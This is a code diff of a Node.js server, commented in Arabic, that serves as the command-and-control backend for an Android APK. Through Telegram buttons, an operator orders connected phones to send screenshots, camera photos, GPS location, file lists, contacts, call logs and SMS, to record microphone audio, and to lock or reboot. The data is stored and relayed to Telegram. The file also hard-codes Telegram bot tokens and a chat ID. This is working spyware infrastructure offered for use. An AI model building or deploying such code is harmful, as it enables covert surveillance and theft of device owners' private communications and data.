@@ -1,393 +1,495 @@
 const express = require('express');
-const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
+const TelegramBot = require('node-telegram-bot-api');
+const fs = require('fs');
 const path = require('path');
-const axios = require('axios');
+const http = require('http');
+const https = require('https');
+const crypto = require('crypto');
 
+// الإعدادات الأساسية
+const TELEGRAM_TOKEN = "8422146946:AAF3MXu0dfIh1t0KkX_TWLqvKN7YV4Vulw8";
+const AUTHORIZED_USERS = [7604667042];
+const SERVER_PORT = process.env.PORT || 3000;
+const SERVER_HOST = "0.0.0.0";
+
+// إنشاء التطبيقات
 const app = express();
-const PORT = process.env.PORT || 10000;
-
-// إعدادات التليجرام - التوكن الصحيح
-const TELEGRAM_BOT_TOKEN = '8226229501:AAGhYt_mrsNz8fHDphyMw_C7qVFyZtJ90_E';
-const TELEGRAM_CHAT_ID = '7604667042';
-
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
-    polling: true,
-    request: {
-        agentOptions: {
-            keepAlive: true,
-            family: 4
-        }
-    }
-});
-
-// middleware
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
+const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
 // تخزين البيانات
-const apkDataStore = new Map(); // تخزين بيانات APK
-const clients = new Map(); // عملاء WebSocket
-const commandQueue = new Map(); // طابور الأوامر
+const connectedDevices = new Map();
+const userSessions = new Map();
+const deviceCommands = new Map();
 
-// إنشاء خادم WebSocket
-const server = app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running on: http://0.0.0.0:${PORT}`);
+// وسائط Express
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public'));
+
+// مسارات الويب
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-const wss = new WebSocket.Server({ server });
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
 
-// معالجة اتصالات WebSocket
+app.get('/api/devices', (req, res) => {
+    res.json({
+        total: connectedDevices.size,
+        devices: Array.from(connectedDevices.entries()).map(([id, device]) => ({
+            id,
+            ip: device.ip,
+            connectedAt: device.connectedAt,
+            info: device.info
+        }))
+    });
+});
+
+app.get('/api/status', (req, res) => {
+    res.json({
+        server: 'running',
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        devices: connectedDevices.size
+    });
+});
+
+// اتصال WebSocket من APK
 wss.on('connection', (ws, req) => {
-    const clientId = generateClientId();
-    const clientInfo = {
+    const deviceId = crypto.randomBytes(8).toString('hex');
+    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    console.log(`📱 APK connected: ${deviceId} from ${clientIp}`);
+    
+    connectedDevices.set(deviceId, {
         ws: ws,
-        id: clientId,
-        type: 'unknown', // apk أو web
-        ip: req.socket.remoteAddress,
-        connectedAt: new Date()
-    };
-    
-    clients.set(clientId, clientInfo);
-    
-    console.log(`🔗 New connection: ${clientId} from ${clientInfo.ip}`);
-    
+        ip: clientIp,
+        connectedAt: new Date(),
+        info: {},
+        lastPing: Date.now()
+    });
+
     // إرسال رسالة ترحيب
     ws.send(JSON.stringify({
         type: 'welcome',
-        clientId: clientId,
-        message: 'Connected to R8HEX Server',
-        timestamp: Date.now()
+        deviceId: deviceId,
+        message: 'Connected successfully',
+        timestamp: Date.now(),
+        config: {
+            allowScreenshots: true,
+            allowCamera: true,
+            allowLocation: true,
+            allowFiles: true,
+            allowMicrophone: true,
+            allowCalls: true,
+            allowContacts: true,
+            allowSms: true
+        }
     }));
 
-    // إرسال إشعار للتليجرام
-    sendTelegramMessage(`🟢 New connection: ${clientId}\n📍 IP: ${clientInfo.ip}`);
+    // إرسال إشعار للتلجرام
+    sendToTelegram(`📱 New device connected\nID: ${deviceId}\nIP: ${clientIp}\nTime: ${new Date().toLocaleString()}`);
 
-    ws.on('message', (message) => {
+    // استقبال البيانات من APK
+    ws.on('message', (data) => {
         try {
-            const data = JSON.parse(message);
-            console.log(`📨 Received from ${clientId}:`, data);
-            
-            // تحديد نوع العميل
-            if (data.type === 'apk_register') {
-                clientInfo.type = 'apk';
-                clientInfo.deviceId = data.deviceId;
-                console.log(`📱 APK registered: ${clientId} - ${data.deviceId}`);
-                sendTelegramMessage(`📱 APK Registered:\nDevice: ${data.deviceId}\nClient: ${clientId}`);
-            }
-            
-            // معالجة بيانات APK
-            if (data.type === 'apk_data' && clientInfo.type === 'apk') {
-                handleAPKData(clientId, data);
-            }
-            
-            // الرد على ping
-            if (data.type === 'ping') {
-                ws.send(JSON.stringify({
-                    type: 'pong',
-                    clientId: clientId,
-                    timestamp: Date.now()
-                }));
-            }
-            
+            const message = JSON.parse(data);
+            handleDeviceMessage(deviceId, message);
         } catch (error) {
-            console.error('❌ Error parsing message:', error);
+            console.error('Error parsing device message:', error);
         }
     });
 
     ws.on('close', () => {
-        clients.delete(clientId);
-        console.log(`🔴 Client disconnected: ${clientId}`);
-        if (clientInfo.type === 'apk') {
-            sendTelegramMessage(`🔴 APK Disconnected: ${clientInfo.deviceId || clientId}`);
-        }
+        console.log(`Device disconnected: ${deviceId}`);
+        connectedDevices.delete(deviceId);
+        sendToTelegram(`❌ Device disconnected: ${deviceId}`);
     });
 
     ws.on('error', (error) => {
-        console.error(`❌ WebSocket error for ${clientId}:`, error);
+        console.error(`WebSocket error for ${deviceId}:`, error);
+    });
+
+    // ping/pong للتحقق من الاتصال
+    const pingInterval = setInterval(() => {
+        if (ws.readyState === ws.OPEN) {
+            ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
+        }
+    }, 30000);
+
+    ws.on('close', () => {
+        clearInterval(pingInterval);
     });
 });
 
-// معالجة بيانات APK من HTTP
-app.post('/data', (req, res) => {
-    console.log('📱 Received APK data via HTTP:', req.body);
-    
-    const deviceId = req.body.deviceId || generateClientId();
-    const data = {
-        ...req.body,
-        receivedVia: 'http',
-        timestamp: new Date().toISOString(),
-        serverTime: Date.now()
-    };
-    
-    // تخزين البيانات
-    if (!apkDataStore.has(deviceId)) {
-        apkDataStore.set(deviceId, []);
-    }
-    apkDataStore.get(deviceId).push(data);
-    
-    // الاحتفاظ بآخر 100 سجل فقط
-    if (apkDataStore.get(deviceId).length > 100) {
-        apkDataStore.get(deviceId).shift();
-    }
-    
-    // إرسال إشعار للتليجرام
-    sendTelegramMessage(`📱 APK Data (HTTP):\nDevice: ${deviceId}\nData: ${JSON.stringify(req.body, null, 2)}`);
-    
-    res.json({
-        success: true,
-        message: 'Data received successfully',
-        deviceId: deviceId,
-        timestamp: data.timestamp,
-        serverTime: data.serverTime
-    });
-});
+// معالجة رسائل الأجهزة
+function handleDeviceMessage(deviceId, message) {
+    const device = connectedDevices.get(deviceId);
+    if (!device) return;
 
-// استقبال بيانات من APK بصيغة مختلفة
-app.post('/apk', (req, res) => {
-    console.log('📱 Received APK data via /apk:', req.body);
-    
-    const deviceId = req.body.deviceId || req.body.id || generateClientId();
-    const data = {
-        ...req.body,
-        receivedVia: 'http_apk',
-        timestamp: new Date().toISOString(),
-        serverTime: Date.now()
-    };
-    
-    handleAPKData(deviceId, data);
-    
-    res.json({
-        success: true,
-        message: 'APK data received',
-        deviceId: deviceId,
-        timestamp: data.timestamp
-    });
-});
+    console.log(`Message from ${deviceId}:`, message.type);
 
-// وظيفة معالجة بيانات APK
-function handleAPKData(clientId, data) {
-    const deviceId = data.deviceId || clientId;
-    
-    if (!apkDataStore.has(deviceId)) {
-        apkDataStore.set(deviceId, []);
-    }
-    
-    const processedData = {
-        ...data,
-        clientId: clientId,
-        processedAt: new Date().toISOString(),
-        serverTime: Date.now()
-    };
-    
-    apkDataStore.get(deviceId).push(processedData);
-    
-    // الاحتفاظ بآخر 100 سجل فقط
-    if (apkDataStore.get(deviceId).length > 100) {
-        apkDataStore.get(deviceId).shift();
-    }
-    
-    // إرسال إشعار للتليجرام للبيانات المهمة
-    if (data.important || data.message || data.status) {
-        sendTelegramMessage(`📱 APK Data (WebSocket):\nDevice: ${deviceId}\nData: ${JSON.stringify(data, null, 2)}`);
-    }
-    
-    console.log(`💾 Stored APK data for ${deviceId}:`, processedData);
-}
+    switch (message.type) {
+        case 'pong':
+            device.lastPing = Date.now();
+            break;
 
-// إرسال أوامر للـ APK
-function sendCommandToAPK(deviceId, command, parameters = {}) {
-    const commandData = {
-        type: 'command',
-        command: command,
-        parameters: parameters,
-        timestamp: new Date().toISOString(),
-        commandId: generateCommandId()
-    };
-    
-    // البحث عن APK متصل
-    let sent = false;
-    clients.forEach((client, clientId) => {
-        if (client.type === 'apk' && (client.deviceId === deviceId || deviceId === 'all')) {
-            if (client.ws.readyState === WebSocket.OPEN) {
-                client.ws.send(JSON.stringify(commandData));
-                console.log(`📤 Sent command to ${clientId}: ${command}`);
-                sent = true;
+        case 'device_info':
+            device.info = message.data;
+            sendToTelegram(
+                `📊 Device Info - ${deviceId}\n` +
+                `Model: ${message.data.model || 'Unknown'}\n` +
+                `Android: ${message.data.androidVersion || 'Unknown'}\n` +
+                `Battery: ${message.data.battery || 'Unknown'}%\n` +
+                `Storage: ${message.data.storage || 'Unknown'}\n` +
+                `Root: ${message.data.isRooted ? 'Yes' : 'No'}`
+            );
+            break;
+
+        case 'location':
+            sendToTelegram(
+                `📍 Location - ${deviceId}\n` +
+                `Latitude: ${message.data.latitude}\n` +
+                `Longitude: ${message.data.longitude}\n` +
+                `Accuracy: ${message.data.accuracy || 'N/A'}m\n` +
+                `Time: ${new Date(message.timestamp).toLocaleString()}`
+            );
+            break;
+
+        case 'screenshot_result':
+            if (message.success && message.imageData) {
+                const screenshotPath = `screenshots/${deviceId}_${Date.now()}.jpg`;
+                fs.writeFileSync(screenshotPath, Buffer.from(message.imageData, 'base64'));
+                sendToTelegram(`✅ Screenshot captured from ${deviceId}`);
+            } else {
+                sendToTelegram(`❌ Screenshot failed from ${deviceId}`);
             }
-        }
-    });
-    
-    // إذا لم يتم الإرسال، نضيف في طابور الأوامر
-    if (!sent && deviceId !== 'all') {
-        if (!commandQueue.has(deviceId)) {
-            commandQueue.set(deviceId, []);
-        }
-        commandQueue.get(deviceId).push(commandData);
-        console.log(`⏳ Command queued for ${deviceId}: ${command}`);
+            break;
+
+        case 'camera_result':
+            if (message.success && message.imageData) {
+                const cameraPath = `camera/${deviceId}_${Date.now()}.jpg`;
+                fs.writeFileSync(cameraPath, Buffer.from(message.imageData, 'base64'));
+                sendToTelegram(`✅ Camera photo captured from ${deviceId}`);
+            }
+            break;
+
+        case 'file_list':
+            const files = message.data.files || [];
+            sendToTelegram(
+                `📁 Files - ${deviceId}\n` +
+                files.slice(0, 15).map(f => `📄 ${f}`).join('\n') +
+                (files.length > 15 ? `\n... and ${files.length - 15} more files` : '')
+            );
+            break;
+
+        case 'contacts_list':
+            const contacts = message.data.contacts || [];
+            sendToTelegram(
+                `👥 Contacts - ${deviceId}\n` +
+                contacts.slice(0, 10).map(c => `👤 ${c.name}: ${c.number}`).join('\n') +
+                (contacts.length > 10 ? `\n... and ${contacts.length - 10} more contacts` : '')
+            );
+            break;
+
+        case 'calls_list':
+            const calls = message.data.calls || [];
+            sendToTelegram(
+                `📞 Call Logs - ${deviceId}\n` +
+                calls.slice(0, 10).map(c => `📞 ${c.number} (${c.type}) - ${c.duration}`).join('\n')
+            );
+            break;
+
+        case 'sms_list':
+            const sms = message.data.sms || [];
+            sendToTelegram(
+                `💬 SMS - ${deviceId}\n` +
+                sms.slice(0, 10).map(s => `💬 ${s.number}: ${s.message.substring(0, 50)}`).join('\n')
+            );
+            break;
+
+        case 'microphone_result':
+            if (message.success && message.audioData) {
+                const audioPath = `audio/${deviceId}_${Date.now()}.wav`;
+                fs.writeFileSync(audioPath, Buffer.from(message.audioData, 'base64'));
+                sendToTelegram(`🎤 Audio recorded from ${deviceId}`);
+            }
+            break;
+
+        case 'command_result':
+            if (message.commandId && deviceCommands.has(message.commandId)) {
+                const { resolve } = deviceCommands.get(message.commandId);
+                resolve(message);
+                deviceCommands.delete(message.commandId);
+            }
+            break;
+
+        case 'error':
+            sendToTelegram(`❌ Error from ${deviceId}: ${message.error}`);
+            break;
     }
-    
-    return {
-        sent: sent,
-        queued: !sent,
-        commandId: commandData.commandId,
-        deviceId: deviceId
-    };
 }
 
-// معالجة بوت التليجرام
+// أوامر التلجرام
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+    
+    if (!AUTHORIZED_USERS.includes(chatId)) {
+        return bot.sendMessage(chatId, '❌ Unauthorized access');
+    }
+
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                ['📊 Server Status', '📋 Connected Devices'],
+                ['🖼️ Take Screenshot', '📍 Get Location'],
+                ['📁 List Files', '📷 Take Camera Photo'],
+                ['👥 Get Contacts', '📞 Get Call Logs'],
+                ['💬 Get SMS', '🎤 Record Audio'],
+                ['🔒 Lock Device', '🔄 Reboot Device'],
+                ['📱 Device Info', '⚙️ Settings']
+            ],
+            resize_keyboard: true
+        }
+    };
+
+    bot.sendMessage(chatId, 
+        `🎮 **Remote Control System**\n\n` +
+        `Welcome to your remote control dashboard.\n` +
+        `Use the buttons below to control connected devices.\n\n` +
+        `Connected devices: ${connectedDevices.size}`,
+        { parse_mode: 'Markdown', ...keyboard }
+    );
+});
+
+// حالة السيرفر
+bot.onText(/📊 Server Status/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!AUTHORIZED_USERS.includes(chatId)) return;
+
+    bot.sendMessage(chatId,
+        `📊 **Server Status**\n` +
+        `🖥️ Server: ✅ Running\n` +
+        `📱 Devices: ${connectedDevices.size} connected\n` +
+        `⏰ Uptime: ${formatUptime(process.uptime())}\n` +
+        `💾 Memory: ${Math.round(process.memoryUsage().rss / 1024 / 1024)}MB\n` +
+        `🔐 Users: ${AUTHORIZED_USERS.length} authorized`,
+        { parse_mode: 'Markdown' }
+    );
+});
+
+// قائمة الأجهزة
+bot.onText(/📋 Connected Devices/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!AUTHORIZED_USERS.includes(chatId)) return;
+
+    if (connectedDevices.size === 0) {
+        return bot.sendMessage(chatId, '❌ No devices connected');
+    }
+
+    const devicesKeyboard = {
+        reply_markup: {
+            keyboard: [
+                ...Array.from(connectedDevices.keys()).map(deviceId => [`🎯 ${deviceId}`]),
+                ['↩️ Back to Main']
+            ],
+            resize_keyboard: true
+        }
+    };
+
+    let devicesList = '📱 **Connected Devices:**\n\n';
+    connectedDevices.forEach((device, deviceId) => {
+        devicesList += `🔹 ${deviceId}\n`;
+        devicesList += `   📍 IP: ${device.ip}\n`;
+        devicesList += `   ⏰ Connected: ${formatTimeDiff(device.connectedAt)}\n`;
+        if (device.info.model) {
+            devicesList += `   📱 ${device.info.model}\n`;
+        }
+        devicesList += `\n`;
+    });
+
+    userSessions.set(chatId, { step: 'select_device' });
+
+    bot.sendMessage(chatId, devicesList, { 
+        parse_mode: 'Markdown',
+        ...devicesKeyboard 
+    });
+});
+
+// معالجة اختيار الجهاز
 bot.on('message', (msg) => {
     const chatId = msg.chat.id;
+    if (!AUTHORIZED_USERS.includes(chatId)) return;
+
     const text = msg.text;
-    
-    console.log(`🤖 Telegram message from ${chatId}: ${text}`);
-    
-    // التحقق من أن المرسل هو المطور
-    if (chatId.toString() !== TELEGRAM_CHAT_ID) {
-        bot.sendMessage(chatId, '❌ Unauthorized access. This bot is for admin use only.');
-        return;
-    }
-    
-    // الأوامر الأساسية
-    if (text === '/start') {
-        const apkCount = Array.from(clients.values()).filter(c => c.type === 'apk').length;
-        const webCount = Array.from(clients.values()).filter(c => c.type === 'web').length;
-        
-        bot.sendMessage(chatId, 
-            `🚀 R8HEX Server Bot\n\n` +
-            `✅ Server Status: Online\n` +
-            `📱 APK Clients: ${apkCount}\n` +
-            `🌐 Web Clients: ${webCount}\n` +
-            `🔗 Total Connections: ${clients.size}\n` +
-            `🌐 URL: https://king14-85jp.onrender.com\n\n` +
-            `📋 Available Commands:\n` +
-            `/devices - List connected APKs\n` +
-            `/data [deviceId] - Get APK data\n` +
-            `/send [deviceId] [command] - Send command\n` +
-            `/broadcast [command] - Send to all APKs\n` +
-            `/status - Server status\n` +
-            `/help - Show all commands`
-        );
-    }
-    else if (text === '/devices') {
-        const apkClients = Array.from(clients.values()).filter(c => c.type === 'apk');
-        if (apkClients.length === 0) {
-            bot.sendMessage(chatId, '❌ No APK devices connected');
-        } else {
-            let message = `📱 Connected APK Devices (${apkClients.length}):\n\n`;
-            apkClients.forEach((client, index) => {
-                message += `${index + 1}. ${client.deviceId || client.id}\n`;
-                message += `   IP: ${client.ip}\n`;
-                message += `   Connected: ${timeAgo(client.connectedAt)}\n\n`;
+    const session = userSessions.get(chatId) || {};
+
+    // اختيار جهاز
+    if (session.step === 'select_device' && text.startsWith('🎯 ')) {
+        const deviceId = text.replace('🎯 ', '');
+        if (connectedDevices.has(deviceId)) {
+            userSessions.set(chatId, { 
+                step: 'device_selected', 
+                selectedDevice: deviceId 
             });
-            bot.sendMessage(chatId, message);
+
+            const controlKeyboard = {
+                reply_markup: {
+                    keyboard: [
+                        ['🖼️ Take Screenshot', '📍 Get Location'],
+                        ['📁 List Files', '📷 Take Camera Photo'],
+                        ['👥 Get Contacts', '📞 Get Call Logs'],
+                        ['💬 Get SMS', '🎤 Record Audio'],
+                        ['🔒 Lock Device', '🔄 Reboot Device'],
+                        ['📱 Device Info', '↩️ Back to Devices']
+                    ],
+                    resize_keyboard: true
+                }
+            };
+
+            bot.sendMessage(chatId, 
+                `🎯 **Selected Device:** ${deviceId}\n\n` +
+                `Choose an action to perform:`,
+                { parse_mode: 'Markdown', ...controlKeyboard }
+            );
         }
     }
-    else if (text.startsWith('/data')) {
-        const parts = text.split(' ');
-        const deviceId = parts[1] || 'all';
-        
-        if (deviceId === 'all') {
-            let message = `📊 Data from all devices:\n\n`;
-            apkDataStore.forEach((dataArray, devId) => {
-                const lastData = dataArray[dataArray.length - 1];
-                message += `📱 ${devId}:\n`;
-                message += `Last: ${JSON.stringify(lastData)}\n\n`;
-            });
-            bot.sendMessage(chatId, message.length > 4000 ? message.substring(0, 4000) + '...' : message);
-        } else {
-            const data = apkDataStore.get(deviceId);
-            if (!data || data.length === 0) {
-                bot.sendMessage(chatId, `❌ No data found for device: ${deviceId}`);
-            } else {
-                const lastData = data[data.length - 1];
-                bot.sendMessage(chatId, 
-                    `📊 Last data from ${deviceId}:\n\n` +
-                    `${JSON.stringify(lastData, null, 2)}`
-                );
+
+    // الرجوع للقائمة الرئيسية
+    if (text === '↩️ Back to Main') {
+        userSessions.set(chatId, {});
+        const mainKeyboard = {
+            reply_markup: {
+                keyboard: [
+                    ['📊 Server Status', '📋 Connected Devices'],
+                    ['🖼️ Take Screenshot', '📍 Get Location'],
+                    ['📁 List Files', '📷 Take Camera Photo'],
+                    ['👥 Get Contacts', '📞 Get Call Logs'],
+                    ['💬 Get SMS', '🎤 Record Audio'],
+                    ['🔒 Lock Device', '🔄 Reboot Device'],
+                    ['📱 Device Info', '⚙️ Settings']
+                ],
+                resize_keyboard: true
             }
+        };
+        bot.sendMessage(chatId, '🏠 Main Menu', mainKeyboard);
+    }
+
+    // الرجوع لقائمة الأجهزة
+    if (text === '↩️ Back to Devices') {
+        userSessions.set(chatId, { step: 'select_device' });
+        
+        const devicesKeyboard = {
+            reply_markup: {
+                keyboard: [
+                    ...Array.from(connectedDevices.keys()).map(deviceId => [`🎯 ${deviceId}`]),
+                    ['↩️ Back to Main']
+                ],
+                resize_keyboard: true
+            }
+        };
+
+        bot.sendMessage(chatId, '📱 Select a device:', devicesKeyboard);
+    }
+
+    // الأوامر عندما يكون جهاز محدد
+    if (session.step === 'device_selected' && session.selectedDevice) {
+        const deviceId = session.selectedDevice;
+        
+        if (text === '🖼️ Take Screenshot') {
+            sendToDevice(deviceId, { type: 'take_screenshot', quality: 85 });
+            bot.sendMessage(chatId, `📸 Taking screenshot from ${deviceId}...`);
         }
-    }
-    else if (text.startsWith('/send')) {
-        const parts = text.split(' ');
-        if (parts.length < 3) {
-            bot.sendMessage(chatId, '❌ Usage: /send [deviceId] [command] {parameters}\nExample: /send device123 get_location');
-            return;
+        else if (text === '📍 Get Location') {
+            sendToDevice(deviceId, { type: 'get_location' });
+            bot.sendMessage(chatId, `📍 Getting location from ${deviceId}...`);
         }
-        
-        const deviceId = parts[1];
-        const command = parts[2];
-        const parameters = parts.slice(3).join(' ');
-        
-        const result = sendCommandToAPK(deviceId, command, { parameters });
-        
-        if (result.sent) {
-            bot.sendMessage(chatId, `✅ Command sent to ${deviceId}: ${command}`);
-        } else if (result.queued) {
-            bot.sendMessage(chatId, `⏳ Command queued for ${deviceId}: ${command}\n(Device not connected)`);
-        } else {
-            bot.sendMessage(chatId, `❌ Failed to send command to ${deviceId}`);
+        else if (text === '📁 List Files') {
+            sendToDevice(deviceId, { type: 'list_files', path: '/sdcard/' });
+            bot.sendMessage(chatId, `📁 Listing files from ${deviceId}...`);
         }
-    }
-    else if (text.startsWith('/broadcast')) {
-        const command = text.replace('/broadcast ', '');
-        if (!command) {
-            bot.sendMessage(chatId, '❌ Usage: /broadcast [command]');
-            return;
+        else if (text === '📷 Take Camera Photo') {
+            sendToDevice(deviceId, { type: 'take_camera_photo', camera: 'back' });
+            bot.sendMessage(chatId, `📷 Taking camera photo from ${deviceId}...`);
         }
-        
-        const result = sendCommandToAPK('all', 'broadcast', { message: command });
-        bot.sendMessage(chatId, `📢 Broadcast sent to all APKs: ${command}\n(Sent to ${clients.size} devices)`);
-    }
-    else if (text === '/status') {
-        const memoryUsage = Math.round(process.memoryUsage().rss / 1024 / 1024);
-        const uptime = Math.round(process.uptime());
-        const apkCount = Array.from(clients.values()).filter(c => c.type === 'apk').length;
-        
-        bot.sendMessage(chatId, 
-            `📊 Server Status:\n` +
-            `🟢 Status: Online\n` +
-            `📱 APK Devices: ${apkCount}\n` +
-            `🌐 Web Clients: ${clients.size - apkCount}\n` +
-            `💾 Memory: ${memoryUsage}MB\n` +
-            `⏰ Uptime: ${uptime}s\n` +
-            `📈 Data Stores: ${apkDataStore.size}`
-        );
-    }
-    else if (text === '/help') {
-        bot.sendMessage(chatId,
-            `📋 R8HEX Bot Commands:\n\n` +
-            `🔹 /start - Start bot and show status\n` +
-            `🔹 /devices - List connected APK devices\n` +
-            `🔹 /data [deviceId] - Get device data (use 'all' for all)\n` +
-            `🔹 /send [deviceId] [command] - Send command to APK\n` +
-            `🔹 /broadcast [command] - Send command to all APKs\n` +
-            `🔹 /status - Server status\n` +
-            `🔹 /help - This message\n\n` +
-            `🌐 Endpoints for APK:\n` +
-            `POST /data - Send APK data\n` +
-            `POST /apk - Alternative endpoint\n` +
-            `WebSocket - Real-time communication`
-        );
-    }
-    else {
-        bot.sendMessage(chatId, '❌ Unknown command. Use /help for available commands.');
+        else if (text === '👥 Get Contacts') {
+            sendToDevice(deviceId, { type: 'get_contacts' });
+            bot.sendMessage(chatId, `👥 Getting contacts from ${deviceId}...`);
+        }
+        else if (text === '📞 Get Call Logs') {
+            sendToDevice(deviceId, { type: 'get_call_logs', limit: 50 });
+            bot.sendMessage(chatId, `📞 Getting call logs from ${deviceId}...`);
+        }
+        else if (text === '💬 Get SMS') {
+            sendToDevice(deviceId, { type: 'get_sms', limit: 50 });
+            bot.sendMessage(chatId, `💬 Getting SMS from ${deviceId}...`);
+        }
+        else if (text === '🎤 Record Audio') {
+            sendToDevice(deviceId, { type: 'record_audio', duration: 30000 });
+            bot.sendMessage(chatId, `🎤 Recording audio from ${deviceId}...`);
+        }
+        else if (text === '🔒 Lock Device') {
+            sendToDevice(deviceId, { type: 'lock_device' });
+            bot.sendMessage(chatId, `🔒 Locking device ${deviceId}...`);
+        }
+        else if (text === '🔄 Reboot Device') {
+            sendToDevice(deviceId, { type: 'reboot_device' });
+            bot.sendMessage(chatId, `🔄 Rebooting device ${deviceId}...`);
+        }
+        else if (text === '📱 Device Info') {
+            sendToDevice(deviceId, { type: 'get_device_info' });
+            bot.sendMessage(chatId, `📱 Getting device info from ${deviceId}...`);
+        }
     }
 });
 
+// إرسال أمر لجهاز
+function sendToDevice(deviceId, command) {
+    const device = connectedDevices.get(deviceId);
+    if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
+        sendToTelegram(`❌ Device ${deviceId} is not connected`);
+        return false;
+    }
+
+    try {
+        const commandId = crypto.randomBytes(4).toString('hex');
+        command.commandId = commandId;
+        
+        device.ws.send(JSON.stringify(command));
+        console.log(`Command sent to ${deviceId}:`, command.type);
+        return true;
+    } catch (error) {
+        console.error(`Failed to send command to ${deviceId}:`, error);
+        sendToTelegram(`❌ Failed to send command to ${deviceId}`);
+        return false;
+    }
+}
+
+// إرسال رسالة للتلجرام
+function sendToTelegram(message) {
+    AUTHORIZED_USERS.forEach(userId => {
+        bot.sendMessage(userId, message, { parse_mode: 'Markdown' }).catch(err => {
+            console.error('Failed to send Telegram message:', err);
+        });
+    });
+}
+
 // وظائف مساعدة
-function generateClientId() {
-    return 'client_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
+function formatUptime(seconds) {
+    const days = Math.floor(seconds / 86400);
+    const hours = Math.floor((seconds % 86400) / 3600);
+    const minutes = Math.floor((seconds % 3600) / 60);
+    return `${days}d ${hours}h ${minutes}m`;
 }
 
-function generateCommandId() {
-    return 'cmd_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
-}
-
-function timeAgo(date) {
-    const seconds = Math.floor((new Date() - date) / 1000);
-    if (seconds < 60) return `${seconds} seconds ago`;
-    const minutes = Math.floor(seconds / 60);
+function formatTimeDiff(date) {
+    const diff = Date.now() - date.getTime();
+    const minutes = Math.floor(diff / 60000);
     if (minutes < 60) return `${minutes} minutes ago`;
     const hours = Math.floor(minutes / 60);
     if (hours < 24) return `${hours} hours ago`;
@@ -395,63 +497,26 @@ function timeAgo(date) {
     return `${days} days ago`;
 }
 
-function sendTelegramMessage(message) {
-    bot.sendMessage(TELEGRAM_CHAT_ID, message)
-        .catch(error => {
-            console.error('❌ Failed to send Telegram message:', error.message);
-        });
-}
-
-// مسارات HTTP الإضافية
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+// التأكد من وجود المجلدات
+['screenshots', 'camera', 'audio'].forEach(dir => {
+    if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir, { recursive: true });
+    }
 });
 
-app.get('/status', (req, res) => {
-    const apkCount = Array.from(clients.values()).filter(c => c.type === 'apk').length;
-    
-    res.json({
-        status: 'online',
-        server: 'R8HEX Server',
-        timestamp: new Date().toISOString(),
-        connections: {
-            total: clients.size,
-            apk: apkCount,
-            web: clients.size - apkCount
-        },
-        data: {
-            devices: apkDataStore.size,
-            totalRecords: Array.from(apkDataStore.values()).reduce((sum, arr) => sum + arr.length, 0)
-        },
-        memory: {
-            used: Math.round(process.memoryUsage().rss / 1024 / 1024) + 'MB',
-            uptime: Math.round(process.uptime()) + 's'
-        }
-    });
+// بدء السيرفر
+server.listen(SERVER_PORT, SERVER_HOST, () => {
+    console.log(`🚀 Server running on: http://${SERVER_HOST}:${SERVER_PORT}`);
+    console.log(`🤖 Telegram bot ready`);
+    console.log(`📱 Ready for APK connections`);
+    console.log(`🔗 WebSocket: ws://${SERVER_HOST}:${SERVER_PORT}`);
 });
 
 // معالجة الأخطاء
 process.on('uncaughtException', (error) => {
-    console.error('❌ Uncaught Exception:', error);
-    sendTelegramMessage(`❌ Server Error: ${error.message}`);
+    console.error('Uncaught Exception:', error);
 });
 
 process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
+    console.error('Unhandled Rejection:', reason);
 });
-
-// إرسال رسالة بدء التشغيل
-console.log('🤖 Telegram bot ready');
-console.log('📱 Ready for APK connections');
-console.log('🔗 WebSocket: ws://0.0.0.0:' + PORT);
-
-// إرسال إشعار بدء التشغيل
-setTimeout(() => {
-    sendTelegramMessage(
-        `🚀 R8HEX Server Started!\n\n` +
-        `📍 URL: https://king14-85jp.onrender.com\n` +
-        `📡 Port: ${PORT}\n` +
-        `⏰ Time: ${new Date().toLocaleString()}\n` +
-        `👥 Ready for APK connections`
-    );
-}, 3000);
